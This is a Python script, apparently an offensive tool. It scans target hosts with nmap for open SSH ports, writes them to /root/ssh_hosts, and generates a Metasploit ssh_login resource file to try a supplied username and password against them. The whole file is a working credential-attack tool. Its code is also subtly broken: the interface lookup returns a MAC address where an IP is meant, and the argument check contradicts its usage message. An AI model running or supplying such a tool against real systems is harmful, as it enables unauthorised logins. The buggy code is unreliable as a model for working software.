import netifaces
import nmap
import sys


if (len(sys.argv) != 5):
	sys.exit("[!] Please provide two arguments the first being the targets the second the ports")



class Ifacedetails:
    def __init__(self):
        pass


    def get_interfaces(self):
        return netifaces.interfaces()


    def get_gateways(self):
        gateways_dic = {}
        gateways = netifaces.gateways()

        for gateway in gateways:
            try:
                gateway_iface = gateways[gateway][netifaces.AF_INET]
                gateway_ip = gateway_iface[0]
                iface = gateway_iface[1]
                gateways_list = [gateway_ip, iface]
                gateways_dic[gateway] = gateways_list
            except:
                pass

        return gateways_dic


    def get_address(self, interface):
        address = netifaces.ifaddresses(interface)
        link_address = address[netifaces.AF_LINK]
        iface_address = address[netifaces.AF_INET]
        iface_dic = link_address[0]
        link_dic = link_address[0]
        hardware_address = link_dic.get('addr')
        iface_addr = iface_dic.get('addr')
        iface_broadcast = iface_dic.get('broadcast')
        iface_netmask = iface_dic.get('netmask')

        return hardware_address, iface_addr, iface_broadcast, iface_netmask


    def get_networks(self, gateways_dic):
        networks_dic = {}

        for key, value in gateways_dic.items():
            gateway_ip = value[0]
            iface = value[1]
            hardware_address, address, broadcast, netmask = self.get_address(iface)
            network = {
                'gateway': gateway_ip,
                'hardware addrress': hardware_address,
                'address': address,
                'broadcast': broadcast,
                'netmask': netmask
            }

            networks_dic[iface] = network

        return networks_dic


class Credentials_atack:
	def __init__(self):
		self.scanner = nmap.PortScanner()
		self.iface = Ifacedetails()
		self.gateways = self.iface.get_gateways()
		self.network_ifaces = self.iface.get_networks(self.gateways)
	

	def resource_file_builder(self, dir, username, password, ips, ports, hosts_file):
		ssh_login_rc = f'{dir}/ssh_login.rc'
		bufsize = 0
		set_module = 'use auxiliary/scanner/ssh/ssh_login \n'
		set_user = f'set username {username} \n'
		set_pass = f'set password {password} \n'
		set_rhosts = f'set rhosts file: {hosts_file} \n'
		set_rport = f'set rport {ports} \n'

		execute = 'run\n'

		file = open(ssh_login_rc, 'w')
		file.write(set_module)
		file.write(set_user)
		file.write(set_pass)
		file.write(set_rhosts)
		file.write(set_rport)
		file.write(execute)
		file.close()


	def target_identifier(self, dir, username, password, ips, ports):
		bufsize = 0
		ssh_hosts = f'{dir}/ssh_hosts'

		self.scanner.scan(ips, ports)

		open(ssh_hosts, 'w').close()

		if (self.scanner.all_hosts()):
			e = open(ssh_hosts, 'a')
		else:
			sys.exit('[!] No viable targets were found!')

		for host in self.scanner.all_hosts():
			for k, v in self.network_ifaces.items():
				if (v['address'] == host):
					print(f"[-] Removing {host} from target list since it belongs to your intergace!")
					host = None

			if(host != None):
				home_dir = '/root'
				ssh_hosts = f'{home_dir}/ssh_hosts'
				bufsize = 0
				e = open(ssh_hosts, 'a')

				if ('ssh' in self.scanner[host]['tcp'][int(ports)]['name']):
					if ('open' in self.scanner[host]['tcp'][int(ports)]['state']):
						print(f"[+] Adding host {host} to {ssh_hosts} since the service is active on {ports}")

						hostdata = f"{host}\n"
						e.write(hostdata)

		if (not self.scanner.all_hosts()):
			e.close()

		if (ssh_hosts):
			return ssh_hosts



hosts = str(sys.argv[1])
ports = str(sys.argv[2])
username = str(sys.argv[3])
password = str(sys.argv[4])
home_dir = '/root'
cr_atack = Credentials_atack()


if __name__ == '__main__':
	hosts_file = cr_atack.target_identifier(home_dir, username, password, hosts, ports)
	cr_atack.resource_file_builder(home_dir, username, password, hosts, ports, hosts_file)